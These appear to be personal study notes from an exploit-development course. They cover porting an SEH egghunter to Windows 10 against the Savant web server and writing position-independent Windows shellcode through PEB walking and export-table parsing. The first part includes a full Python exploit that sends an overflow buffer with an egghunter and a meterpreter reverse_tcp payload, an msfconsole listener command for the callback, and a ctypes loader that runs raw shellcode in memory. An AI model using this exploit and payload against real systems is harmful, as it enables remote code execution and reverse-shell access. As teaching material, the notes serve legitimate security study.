Unfortunately, we never reach our `_except_handler` function. When we resume execution, we trigger the access violation again.

### Identifying the SEH-Based Egghunter Issue

Open `ntdll.dll` in IDA `C:\Installers\egghunter\ntdll.idb`

when an exception is raised, a call to `ntdll!KiUserExceptionDispatcher` is made. This function will then call `RtlDispatchException`, which will retrieve the `ExceptionList` and parse it.

`bp ntdll!RtlDispatchException`

While going through the code blocks of the `RtlDispatchException` function, we find a call to `RtlpGetStackLimits`.

`RtlpGetStackLimits` is used to retrieve the current stack limits.

The `TEB` structure contains the `StackBase` and `StackLimit` values, and `ExceptionList`.

`dt _NT_TIB`

```
ntdll!_NT_TIB
   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 StackBase        : Ptr32 Void
   +0x008 StackLimit       : Ptr32 Void
   +0x00c SubSystemTib     : Ptr32 Void
   +0x010 FiberData        : Ptr32 Void
   +0x010 Version          : Uint4B
   +0x014 ArbitraryUserPointer : Ptr32 Void
   +0x018 Self             : Ptr32 _NT_TIB
```

We find a call to `RtlIsValidHandle`, which is responsible for various checks including the SafeSEH implementation.

When we continue our inspection of other code blocks, we aren't able to find another call to this function.

=> We have to reach this particular code block to successfully call our custom `_except_handler` function.

To reach the `RtlIsValidHandle` call, we have to pass the following checks:

1.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure needs to be higher than the `StackLimit`.

2.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure plus `0x08` needs to be lower than the `StackBase`.

3.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure needs to be aligned to the 4 bytes boundary.

4.	The memory address of our `_except_handler` function needs to be located at a higher address than the `StackBase`.

=>

1. Pass. Because our egghunter code pushed the custom `_EXCEPTION_REGISTRATION_RECORD` structure onto the stack and then overwrote the `ExceptionList` with the value of the ESP register.

2. Pass. Since we pushed the `_EXCEPTION_REGISTRATION_RECORD` structure on the stack. The reason it adds `0x08` bytes from the `_EXCEPTION_REGISTRATION_RECORD` structure is due to its size, which contains 2 DWORD-sized members.
 
3. Pass. Given that we have not performed any arithmetic operations on ESP, we have maintained the alignment. (By default, the OS and compilers ensure that the stack, as well as other classes and structure members, are aligned accordingly.)

4. Failed. Because the `_except_handler` function is implemented in the egghunter located on the stack.

=> we will not reach the call to `RtlIsValidHandle`.

In addition to these 4 checks, if **SafeSEH** is enabled, every `_except_handler` function address is going to be validated by the `RtlIsValidHandle`.

Our binary does not come compiled with any protections.

`!nmod`

```
00400000 00452000 Savant  /SafeSEH OFF  C:\Savant\Savant.exe
```

To bypass the check, we can attempt to overwrite the `StackBase` in the `TEB` with an appropriately crafted value. It would have to be lower than the address of our `_except_handler` function, but higher than the address of our `_EXCEPTION_REGISTRATION_RECORD` structure.

Our egghunter already gathers the address of the `_except_handler` function dynamically, so we could subtract a small number of bytes from it and use that to overwrite the `StackBase`.

`egghunter_seh_win10.py`

```python
...
"	build_exception_record: 				 "
		# pop the address of the exception_handler 
		# into ecx
"		pop ecx 							;" 
		# mov signature into eax
"		mov eax, 0x74303077 				;" 
		# push Handler of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;" 
		# push Next of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;" 
		# null out ebx
"		xor ebx, ebx 						;" 
		# overwrite ExceptionList in the TEB with a pointer 
		# to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;" 
		# subtract 0x04 from the pointer 
		# to exception_handler
"		sub ecx, 0x04 						;" 
		# add 0x04 to ebx
"		add ebx, 0x04 						;" 
		# overwrite the StackBase in the TEB
"		mov dword ptr fs:[ebx], ecx 		;" 
...
```

Our new egghunter adds some additional instructions to the `build_exception_record` function:

- overwrites the `ExceptionList` from the TEB, 

- subtract `0x04` from `ECX`, which still holds the address of our `_except_handler` function.

- increases the value of `EBX` by `0x04` and uses that as an offset into the FS register to overwrite the `StackBase`.

### Porting the SEH Egghunter to Windows 10

#### SEH-based egghunter

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 80
    size = 253

    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
                b"\xeb\x2a\x59\xb8\x77\x30\x30\x74"
                b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
                b"\x83\xe9\x04\x83\xc3\x04\x64\x89"
                b"\x0b\x6a\x02\x59\x89\xdf\xf3\xaf"
                b"\x75\x07\xff\xe7\x66\x81\xcb\xff"
                b"\x0f\x43\xeb\xed\xe8\xd1\xff\xff"
                b"\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
                b"\xb8\x83\x04\x08\x06\x58\x83\xc4"
                b"\x10\x50\x31\xc0\xc3")

    inputBuffer = b"\x41" * (size - len(egghunter))
    inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload

    payload =  b""
    payload += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
    ...
    payload += b"\xff\xd5"

    shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload))

    buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    
    print("Done!")
  
except socket.error:
    print("Could not connect!")
```

Set a breakpoint at the `POP EAX; RET` instruction sequence, let the execution flow continue

Inspect the `ExceptionList` and the `StackBase`

`t`

```
03e5eabe 6a02            push    2
```

`!teb`

```
TEB at 00234000
    ExceptionList:        03e5ea2c
    StackBase:            03e5ead2
    StackLimit:           03e5c000
    SubSystemTib:         00000000
...
```

`dt _EXCEPTION_REGISTRATION_RECORD 03e5ea2c`

```
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x03e5ead6     _EXCEPTION_DISPOSITION  +3e5ead6
```

We have successfully managed to overwrite the `StackBase` with a value that is lower than the memory address of our `_except_handler` function, but higher than the memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure.

Letting the debugger continue execution will trigger the access violation. 

Set a breakpoint at the `_except_handler` function to determine if overwriting the `StackBase` was enough.

`g`

```
03e5eac3 f3af            repe scas dword ptr es:[edi]
```

`!exchain`

```
03e5ea2c: 03e5ead6
Invalid exception stack at ffffffff
```

`bp 03e5ead6`

`g`

```
Breakpoint 1 hit
03e5ead6 6a0c            push    0Ch
```

`u @eip`

```
03e5ead6 6a0c            push    0Ch
03e5ead8 59              pop     ecx
03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx]
03e5eadc b1b8            mov     cl,0B8h
03e5eade 83040806        add     dword ptr [eax+ecx],6
03e5eae2 58              pop     eax
03e5eae3 83c410          add     esp,10h
03e5eae6 50              push    eax
```

We managed to successfully reach our `_except_handler` function.

`Eip` member of the `CONTEXT` structure points to the instruction that caused the access violation (`REPE SCASD`).

Remove any breakpoints and let the execution flow resume while waiting for our shell. 

Unfortunately, every time we hit an unmapped memory page or one we don't have access to, we get an access violation, which halts the debugger.

These can be temporarily disabled in WinDbg.

To avoid stopping the execution for every "first time" exception, use the `sxd` command to disable them. This will also **disable guard pages**.

`sxd av`

`sxd gp`

`bc *`

`g`

Set up a listener.

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
```

Our egghunter maintains functionality on older Windows versions such as 7 or 8.

## Extra Mile

```python

```

# Creating Custom Shellcode

## Calling Conventions on x86

`Win32 API` functions use the `__stdcall` calling convention, while C runtime functions use the `__cdecl` calling convention.

In both of these cases, the **parameters** are pushed to the **stack** by the caller in **reverse** order.

However, when using `__stdcall`, the stack is cleaned up by the **callee**, while it is cleaned up by the **caller** when `__cdecl` is used.

For any calling convention on a 32-bit system:
- The `EAX, EDX, and ECX` registers are considered volatile, i.e. they can be **clobbered** during a function call.
- All other registers are considered non-volatile and must be preserved by the callee.

**clobbered**: the process of overwriting the value of a CPU register as part of a function call and not restoring it back to the original value before returning out of the call.

## The System Call Problem

The **Windows Native API** is a mostly-undocumented API exposed to user-mode applications by the `ntdll.dll` library. A way for user-mode applications to call OS functions located in the kernel in a controlled manner.

Kernel-level functions are typically identified by **system call numbers**.

On Windows, these system call numbers tend to **change** between major and minor version releases.

The feature set exported by the Windows system call interface is rather **limited**.

E.g., Windows does not export a socket API via the system call interface. 

=> Avoid direct system calls to write universal and reliable shellcode for Windows.

Without system calls, our only option for communicating directly with the kernel is to use the **Windows API**, which is exported by `DLLs` that are mapped into process memory space at runtime.

If DLLs are not already loaded into the process space, **load** them and **locate** the functions they export > invoke them as part of our shellcode to perform specific tasks.

`kernel32.dll`:

- The `LoadLibraryA` function implements the mechanism to load DLLs.

- `GetModuleHandleA` can be used to get the base address of an already-loaded DLL.

- `GetProcAddress` can be used to resolve symbols.

**Avoid** the use of **hard-coded function addresses** to ensure our shellcode is **portable** across different Windows versions.

The memory addresses of `LoadLibrary` and `GetProcAddress` are not automatically known to us when we want to execute our shellcode in memory.

1. Obtain the **base address** of `kernel32.dll`.

2. Resolve various function addresses from `kernel32.dll` and any other required `DLLs`.

3. Invoke our resolved functions to achieve various results.

## Finding kernel32.dll

Ensure that the DLL is mapped within the same memory space as our running shellcode.

`kernel32.dll` is almost guaranteed to be loaded because it exports core APIs required for most processes.

Once we obtain the **base address** of `kernel32.dll` and can resolve its exported functions, we'll:

- Load additional DLLs using `LoadLibraryA`

- Leverage `GetProcAddress` to resolve functions within them.

The most commonly-used method relies on the Process Environmental Block (`PEB`) structure.

2 other techniques, the Structured Exception Handler (SEH)1 and the "Top Stack" method, are less portable and will not work on modern versions of Windows.

### PEB Method

The `PEB` structure is allocated by the OS for every running **process**.

On 32-bit versions of Windows, the `FS` register always contains a pointer to the current Thread Environment Block (`TEB`).

The `TEB` is a data structure that stores information about the currently-running **thread**.

Dump the TEB structure.

`dt nt!_TEB @$teb`

```
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   ...
   +0x030 ProcessEnvironmentBlock : 0x7f60b000 _PEB
...
```

At offset `0x30`, a pointer to the `PEB` structure.

Information from the `PEB`, including the **image name, process startup arguments, process heaps**, and more.

Gather a pointer to the `_PEB_LDR_DATA` structure through the `PEB`:

`dt nt!_PEB 0x7f60b000`

```
ntdll!_PEB
...
   +0x008 ImageBaseAddress : 0x00230000 Void
   +0x00c Ldr              : 0x776c9aa0 _PEB_LDR_DATA
...
```

The `_PEB_LDR_DATA` structure, located at offset `0x0C` inside the `PEB`.

This pointer references 3 linked lists revealing the **loaded modules** that have been mapped into the process memory space.

Gather the `InInitializationOrderModuleList` list through the `_PEB_LDR_DATA` structure:

`dt _PEB_LDR_DATA 0x776c9aa0`

```
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x30
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4011728 - 0x40180d0 ]
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4011730 - 0x40180d8 ]
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4011658 - 0x40180e0 ]
...
```

3 linked lists:

- `InLoadOrderModuleList` shows the previous and next module in load order.
-	`InMemoryOrderModuleList` shows the previous and next module in memory placement order.
-	`InInitializationOrderModuleList` shows the previous and next module in initialization order.

WinDbg describes `InInitializationOrderModuleList` as a `LIST_ENTRY` structure composed of 2 fields:

Dump the `_LIST_ENTRY` structure:

`dt _LIST_ENTRY (0x776c9aa0 + 0x1c)`

```
ntdll!_LIST_ENTRY
 [ 0x4011658 - 0x40180e0 ]
   +0x000 Flink            : 0x04011658 _LIST_ENTRY [ 0x4011d88 - 0x776c9abc ]
   +0x004 Blink            : 0x040180e0 _LIST_ENTRY [ 0x776c9abc - 0x40188c0 ]
```

The `Flink` and `Blink` fields are commonly used in doubly-linked lists to access the next (Flink) or previous (Blink) entry in the list.

The `_LIST_ENTRY` structure indicated in the `_PEB_LDR_DATA` is embedded as part of a larger structure of type `_LDR_DATA_TABLE_ENTRY_`.

Dump the `LDR_DATA_TABLE_ENTRY` structure (Subtract the value `0x10` from the address of the `_LIST_ENTRY` structure to reach the beginning of the `_LDR_DATA_TABLE_ENTRY_` structure.)

`dt _LDR_DATA_TABLE_ENTRY (0x04011658 - 0x10)`

```
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4011ab0 - 0x4011728 ]
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4011ab8 - 0x4011730 ]
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x4011d88 - 0x776c9abc ]
   +0x018 DllBase          : 0x775c0000 Void
   +0x01c EntryPoint       : (null) 
   +0x020 SizeOfImage      : 0x17a000
   +0x024 FullDllName      : _UNICODE_STRING "C:\Windows\SYSTEM32\ntdll.dll"
   +0x02c BaseDllName      : _UNICODE_STRING "ntdll.dll"
   +0x034 FlagGroup        : [4]  "???"
   +0x034 Flags            : 0xa2c4
...
```

- `DllBase` field holds the DLL's base address.

- `BaseDllName` field, a nested structure of `_UNICODE_STRING` type, holds he name of the DLL

The `_UNICODE_STRING` structure has a `Buffer` member starting at offset `0x04` from the beginning of this structure, which contains a pointer to a string of characters.

=> The DLL name starts at offset `0x30` (=`0x2c + 0x04`) from the beginning of the `_LDR_DATA_TABLE_ENTRY_` structure.

### Assembling the Shellcode

- Use the Keystone Framework to assemble our shellcode on the fly.

- Use the `CTypes` Python library to run this code directly in the memory space of the `python.exe` process using a number of Windows APIs.

Our Python script will:

-	Transform our ASM code into opcodes using the Keystone framework.
- Allocate a chunk of memory for our shellcode.
-	Copy our shellcode to the allocated memory.
-	Execute the shellcode from the allocated memory.

Uses the `PEB` technique to retrieve the base address of `kernel32.dll`.

`find_kernel32.py`

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 60h                  ;"  #

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+30h]          ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0Ch]             ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder
    
    " next_module:                      "  #
    "   mov   ebx, [esi+8h]             ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+20h]            ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module.
    "   ret                             ;"  #
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
```

The `.asm` method will produce the opcodes for our shellcode.

Using CTypes to call Windows APIs from Python

Once the opcodes of our shellcode are stored as a byte array, call `VirtualAlloc`to allocate a memory page with `PAGE_EXECUTE_READWRITE` protections.

- Call `RtlMoveMemory` to copy the shellcode opcodes to the newly-allocated memory page.

- Call `CreateThread` to run the shellcode in a new thread.

`start` function:

- Leverage `int3` instruction as a software breakpoint to break right before our shellcode, saving us time from printing out the allocated memory address and manually setting the breakpoint in our debugger each time we run our script.

- `mov ebp, esp; sub esp, 60h`: emulates an actual function call in which the ESP register is moved to EBP so that arguments passed to the function can be easily accessed. Subtract an arbitrary offset so that the stack does not get clobbered.

`find_kernel32` function:

- The `mov esi, fs:[ecx+0x30]` instruction stores the pointer to the `PEB` in the ESI register.

- Dereference ESI at offset `0x0C` to get a pointer to the `_PEB_LDR_DATA` structure and store it in ESI once again.

- Dereference ESI at offset `0x1C`, to get the `InInitializationOrderModuleList` entry.

The `next_module` function:

- Move the **base address** of a loaded module to the `EBX` register and the **module name** to `EDI`.

- Sets `ESI` to the **next** `InInitializationOrderModuleList` entry using the `Flink` member.

- Compare the WORD pointed to by `edi + 12 * 2` to `NULL` (`ecx`).

The length of the `kernel32.dll` string is `12` bytes. Because the string is stored in `UNICODE` format, every character of the string will be represented as a `WORD`, making the length `24` in Unicode.

=> If the WORD starting at the `25th` byte is `NULL`, we have found a string of `12 UNICODE` characters.

If the comparison fails, take a conditional jump back to `next_module` and proceed to check the next entry until the comparison succeeds.

Because `InInitializationOrderModuleList` displays modules based on the order they were initialized, the 1st module name that matches the comparison will always be `kernel32.dll`, as it is one of the first to be initialized.

Until the release of Windows 7, the `kernel32.dll` initialization order was always constant for all Microsoft OSs.

This method became ineffective in Windows 7 and a more universal method was introduced that works on later versions of Windows as well.

```bat
python find_kernel32.py
```

Attach WinDbg to the `python.exe` process

`u @eip Ld`

```
011e0000 cc              int     3
011e0001 89e5            mov     ebp,esp
011e0003 83ec60          sub     esp,60h
011e0006 31c9            xor     ecx,ecx
011e0008 648b7130        mov     esi,dword ptr fs:[ecx+30h]
011e000c 8b760c          mov     esi,dword ptr [esi+0Ch]
011e000f 8b761c          mov     esi,dword ptr [esi+1Ch]
011e0012 8b5e08          mov     ebx,dword ptr [esi+8]
011e0015 8b7e20          mov     edi,dword ptr [esi+20h]
011e0018 8b36            mov     esi,dword ptr [esi]
011e001a 66394f18        cmp     word ptr [edi+18h],cx
011e001e 75f2            jne     011e0012
011e0020 c3              ret
```

Set a breakpoint at the compare instruction 

`bp 011e001a`

`g`

`r @ebx`

```
ebx=77020000
```

`du @edi`

```
77026c08  "ntdll.dll"
```

`lm m ntdll`

```
Browse full module list
start    end        module name
77020000 7719a000   ntdll      (pdb symbols)          c:\symbols\ntdll.pdb\FA32EA7CECAA40BA94BF296AC6F178701\ntdll.pdb
```

=> The `ntdll.dll` module as the 1st entry + The base address gathered from the `_LDR_DATA_TABLE_ENTRY_` structure is correct.

The **conditional jump** will be taken, causing us to loop over the entries until we find the entry for the `kernel32.dll` module.

Allow the execution to continue until the next `return` instruction - the last instruction in our shellcode that will be executed if the conditional jump is not taken.

`pt`

```
011e0020 c3              ret
```

`r @ebx`

```
ebx=76e40000
```

`du @edi`

```
00f11c90  "KERNEL32.DLL"
```

`lm m kernel32`

```
Browse full module list
start    end        module name
76e40000 76ed5000   KERNEL32   (pdb symbols)          c:\symbols\kernel32.pdb\F8E18714F7AC4AD1AC00CC0C6D41DD991\kernel32.pdb
```

## Resolving Symbols

Our shellcode will crash if we continue to execute assembly instructions after the return.

To cleanly exit our shellcode, dynamically resolve the address of `TerminateProcess` API using the `Export Directory Table`.

`kernel32.dll` exports APIs such as `GetProcAddress`, which will allow us to locate various exported functions. The issue is that `GetProcAddress` also needs to be located before it can be used.

=> Traverse the `Export Address Table` (EAT) of a DLL loaded in memory.

To gather a **module's EAT address**, first acquire the **base address** of the selected DLL.

### Export Directory Table

The most reliable way to **resolve symbols** from DLLs is by using the **Export Directory Table** method.

**Symbols** refers to the **function names** and their **starting memory addresses**.

DLLs that export functions have an export directory table that contains important information about symbols:

-	Number of exported symbols.
-	Relative Virtual Address (`RVA`) of the export-functions array.
-	`RVA` of the export-names array.
-	`RVA` of the export-ordinals array.

The Export Directory Table `_IMAGE_EXPORT_DIRECTORY` structure contains additional fields:

```C
typedef struct _IMAGE_EXPORT_DIRECTORY {
  DWORD Characteristics;
  DWORD TimeDateStamp;
  WORD MajorVersion;
  WORD MinorVersion;
  DWORD Name;
  DWORD Base;
  DWORD NumberOfFunctions;
  DWORD NumberOfNames;
  DWORD AddressOfFunctions;
  DWORD AddressOfNames;
  DWORD AddressOfNameOrdinals;
}
```

To resolve a symbol by name, begin with the `AddressOfNames` array.

Every name will have a unique entry and **index** in the array.

- Once found the name of the symbol at index `i` in the `AddressOfNames` array, use the same index `i` in the `AddressOfNameOrdinals` array.

- The entry from the `AddressOfNameOrdinals` array at index `i` will contain a new index that we will use in the `AddressOfFunctions` array.

- At this new index, find the **relative** VMA of the function.

- Translate this address into a VMA by adding the **base address** of the DLL to it.

Since the size of our shellcode is important, optimize the search algorithm for our required symbol names.

=> Use a **hashing function** that transforms a string into a 4 byte hash.

Once the `LoadLibraryA` symbol has been resolved, we can load arbitrary modules and locate the functions needed to build our custom shellcode without using `GetProcAddress`.

### Working with the Export Names Array

The `Export Directory Table` structure fields contain **relative** addresses.

To obtain the `VMA`, add the `kernel32.dll` base address to the RVA, which is currently stored in the `EBX` register.

`resolving_symbols_0x01.py`: Finding the Export Directory Table and AddressOfNames VMAs

```python
...
CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 0x200                ;"  #
    "   call  find_kernel32             ;"  #
    "   call  find_function             ;"  #

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module.
    "   ret                             ;"  #

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
)
...
```

The instructions required to find the base address of `kernel32.dll` have been encapsulated into the `find_kernel32` function.

`find_function` function:

- Saves all the register values on the stack using `PUSHAD` => to restore these values cleanly later on, even if our ASM code clobbers the register values during its execution.

- Store the value pointed to by the `EBX` register (which holds the base address of `kernel32.dll`) at offset `0x3C` in `EAX`. At this offset from the beginning of a PE (`MS-DOS header`) is the offset to the `PE header`.

- Add the value stored in `EAX` to the base address of `kernel32.dll` along with a static offset of `0x78`, and stores the dereferenced value in `EDI`. The `0x78` offset from the `PE header` is the location of the `RVA` of the `Export Directory Table`.

- This address is then converted into a `VMA` by adding it to the **base address** of `kernel32.dll`. `EDI` now contains the `VMA` of our `Export Directory Table`.

- Store the value pointed to by `EDI` and a static offset of `0x18` into `ECX`. This is the offset to the `NumberOfNames` field which contains the number of exported symbols. => use `ECX` as a counter to parse the `AddressOfNames` array.

- Move the value pointed to by `EDI` and the static offset of `0x20`, which corresponds to the `AddressOfNames` field, into `EAX`. Since this is a `RVA`, add the **base address** of `kernel32.dll` to it in order to obtain the `VMA` of the `AddressOfNames` array.

- Stores the `AddressOfNames VMA` at an arbitrary offset from `EBP`. Currently, EBP contains a pointer to the stack, thanks to the `mov ebp, esp` instruction.

`find_function_loop` function:

- `jecxz find_function_finished` jump will be taken if `ECX`, which holds the number of exported symbols, is `NULL`, i.e. reached the end of the array without finding our symbol name.

- If the `ECX` register is not `NULL`, decrement our counter (`ECX`) and retrieve the previously-saved `AddressOfNames VMA`.

- Save the `RVA` of the symbol name in `ESI`. Because each entry in the array is a DWORD, use the counter `ECX` as an index to the `AddressOfNames` array and multiply it by `4`.

- Obtain the `VMA` of the symbol name by adding the **base address** of `kernel32.dll` to the `ESI` register.

Dumping the `IMAGE_DOS_HEADER` structure to obtain the offset to the `PE header`

`lm m kernel32`

```
Browse full module list
start    end        module name
76e40000 76ed5000   KERNEL32   (pdb symbols)          c:\symbols\kernel32.pdb\F8E18714F7AC4AD1AC00CC0C6D41DD991\kernel32.pdb
```

`dt ntdll!_IMAGE_DOS_HEADER 0x76e40000`

```
   +0x000 e_magic          : 0x5a4d
   +0x002 e_cblp           : 0x90
...
   +0x03c e_lfanew         : 0n248
```

`? 0n248`

```
Evaluate expression: 248 = 000000f8
```

The PE header can be found at offset `0xF8`. Reviewing the PE header structure (`_IMAGE_NT_HEADERS`), we'll notice the `IMAGE_OPTIONAL_HEADER` structure at offset `0x18`:

`dt ntdll!_IMAGE_NT_HEADERS 0x76e40000 + 0xf8`

```
   +0x000 Signature        : 0x4550
   +0x004 FileHeader       : _IMAGE_FILE_HEADER
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
```

The `_IMAGE_OPTIONAL_HEADER` structure contains another structure named `_IMAGE_DATA_DIRECTORY` at offset `0x60`:

`dt ntdll!_IMAGE_OPTIONAL_HEADER 0x76e40000 + 0xf8 + 0x18`

```
   +0x000 Magic            : 0x10b
   +0x002 MajorLinkerVersion : 0xc ''
   +0x003 MinorLinkerVersion : 0xa ''
...
   +0x05c NumberOfRvaAndSizes : 0x10
   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY
```

The `DataDirectory` is an array of length `16`. Each entry in this array is an `_IMAGE_DATA_DIRECTORY` structure.

Examine the `_IMAGE_DATA_DIRECTORY` structure prototype which is comprised of 2 DWORD fields, (= `0x08` size):

```C
typedef struct _IMAGE_DATA_DIRECTORY {
  DWORD VirtualAddress;
  DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

The `DataDirectory` array holds information about the `Export Directory Table`.

Even though the structure field is named VirtualAddress, this field contains the **relative** virtual address.

`dt ntdll!_IMAGE_DATA_DIRECTORY 0x76e40000 + 0xf8 + 0x78`

```
   +0x000 VirtualAddress   : 0x75940
   +0x004 Size             : 0xd1c0
```

Dump all the file header information.

`!dh -f kernel32`

```
...
OPTIONAL HEADER VALUES
     10B magic #
   12.10 linker version
   82000 size of code
   12000 size of initialized data
       0 size of uninitialized data
   1DF30 address of entry point
    1000 base of code
...
    4140  DLL characteristics
            Dynamic base
            NX compatible
            Guard
   75940 [    D1C0] address [size] of Export Directory
   85354 [     4EC] address [size] of Import Directory
...
```

### Computing Function Name Hashes

After obtaining the address to the `ArrayOfNames` array, parse it for the symbol we are interested in, namely `TerminateProcess`.

Use a hashing algorithm to search for this symbol in the array.

`resolving_symbols_0x02.py`: Hash Routines to Compute Function Names

```python
    CODE = (
    ...
    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   Zero eax
    "   cdq                             ;"  #   Zero edx
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
)
```

The final instruction fetches the 1st entry in `ArrayOfNames` and converts to a `VMA` with the `ESI` register pointing to the symbol name.

The `compute_hash` function:

- `XOR` operation sets the `EAX` register to `NULL`.

- The `CDQ` instruction uses the `NULL` value in `EAX` to set `EDX` to `NULL` as well.

- `CLD` clears the direction flag (`DF`) in the `EFLAGS` register and cause all string operations to increment the index registers, which are `ESI` (where our symbol name is stored) and/or `EDI`.

The `compute_hash_again` function:

